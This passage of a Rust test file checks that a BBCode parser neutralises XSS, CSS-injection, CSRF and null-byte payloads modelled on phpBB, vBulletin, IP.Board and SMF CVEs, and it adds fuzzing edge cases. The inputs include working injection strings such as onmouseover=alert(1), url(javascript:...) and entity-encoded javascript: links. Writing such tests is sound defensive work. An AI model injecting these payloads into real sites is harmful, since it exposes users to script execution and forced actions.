        let result = parse(r#"[url=http://x.com][color="onmouseover=alert(1) "]x[/color][/url]"#);
        assert!(
            !result.contains(" onmouseover=") || result.contains("[color="),
            "CVE-2019-12830 style attack blocked"
        );
    }

    /// phpBB CVE-2019-16108 - CSS token injection
    #[test]
    fn phpbb_cve_2019_16108_css_injection() {
        let result = parse("[table=1;background:url(javascript:alert(1))]x[/table]");
        assert!(
            !result.contains("url(javascript:"),
            "phpBB CVE-2019-16108 CSS injection blocked"
        );
    }

    /// vBulletin nested parser attack
    #[test]
    fn vbulletin_nested_font_video() {
        let result = parse(r#"[url=aaa][font="a onmouseover=alert(1) a"]a[/font][/url]"#);
        assert!(
            !result.contains(" onmouseover=") || result.contains("[font="),
            "vBulletin nested font attack blocked"
        );
    }

    /// IP.Board regex bypass
    #[test]
    fn ipboard_regex_bypass() {
        let result = parse("[img]http://x.com/[<script>alert(1)</script>].png[/img]");
        assert!(
            !result.contains("<script>"),
            "IP.Board regex bypass blocked"
        );
    }

    /// SMF CSRF via img referer
    #[test]
    fn smf_img_referer_csrf() {
        // This tests that dangerous URLs are blocked in images
        let result = parse("[img]http://target.com?action=logout[/img]");
        // This should render as an image (it's a valid HTTP URL)
        // The security concern is about the Referer header, not XSS
        // So this test just verifies normal image rendering
        assert!(
            result.contains("<img") || result.contains("[img]"),
            "SMF img renders or is rejected"
        );
    }

    /// SMF null byte injection
    #[test]
    fn smf_null_byte_injection() {
        let result = parse("[img]http://example.com?action%00=logout[/img]");
        // Should handle null byte in URL
        assert!(
            result.contains("%00") || !result.contains("action=logout"),
            "SMF null byte handled"
        );
    }
}

// ============================================================================
// SECTION 13: FUZZING-STYLE EDGE CASES
// ============================================================================

mod fuzzing_edge_cases {
    use super::*;

    #[test]
    fn empty_tag_name() {
        let result = parse("[=value]text[/]");
        // Should handle gracefully
        assert!(result.contains("text"), "Empty tag name handled");
    }

    #[test]
    fn very_long_tag_name() {
        let long_name = "a".repeat(1000);
        let result = parse(&format!("[{}]text[/{}]", long_name, long_name));
        // Should handle gracefully without crashing
        assert!(result.contains("text"), "Long tag name handled");
    }

    #[test]
    fn very_long_attribute() {
        let long_attr = "a".repeat(10000);
        let result = parse(&format!("[url={}]text[/url]", long_attr));
        // Should handle gracefully
        assert!(result.contains("text"), "Long attribute handled");
    }

    #[test]
    fn many_nested_unclosed_tags() {
        let input = "[url=[url=[url=[url=[url=".repeat(100);
        let result = parse(&input);
        // Should not crash
        assert!(!result.is_empty() || input.is_empty(), "Many unclosed tags handled");
    }

    #[test]
    fn alternating_open_close() {
        let input = "[b][/b]".repeat(1000);
        let result = parse(&input);
        // Should produce balanced output
        let opens = result.matches("<strong>").count();
        let closes = result.matches("</strong>").count();
        assert_eq!(opens, closes, "Alternating tags balanced");
    }

    #[test]
    fn bracket_inside_value() {
        let result = parse("[url=[test]Link[/url]");
        // Should handle nested brackets in value
        assert!(result.contains("Link") || result.contains("[url="), "Bracket in value handled");
    }

    #[test]
    fn newlines_in_tag() {
        let result = parse("[url=http://x.com\n]Link[/url]");
        // Should handle newline in tag
        assert!(result.contains("Link"), "Newline in tag handled");
    }

    #[test]
    fn unicode_tag_name() {
        let result = parse("[日本語]text[/日本語]");
        // Should handle as unknown tag
        assert!(result.contains("text"), "Unicode tag name handled");
    }

    #[test]
    fn mixed_encoding_stress_test() {
        let result = parse(
            "[url=&#x6A;&#97;v&#x61;s&#99;ript:alert(1)]Click[/url]",
        );
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Mixed encoding stress test"
        );
    }

    #[test]
    fn repeated_dangerous_protocols() {
        let result =
            parse("[url=javascript:javascript:javascript:alert(1)]Click[/url]");
        assert!(
            !result.to_lowercase().contains("href=\"javascript:"),
            "Repeated javascript: blocked"
        );
    }

    #[test]
    fn whitespace_only_value() {
        let result = parse("[url=   ]Link[/url]");
        // Empty/whitespace URL should be handled
        assert!(result.contains("Link"), "Whitespace only value handled");
    }

    #[test]
    fn null_byte_everywhere() {
        let result = parse("[url=\x00http://x.com\x00]Link\x00[/url]");
        // Should handle null bytes throughout
        assert!(!result.is_empty(), "Null bytes handled throughout");
    }
}
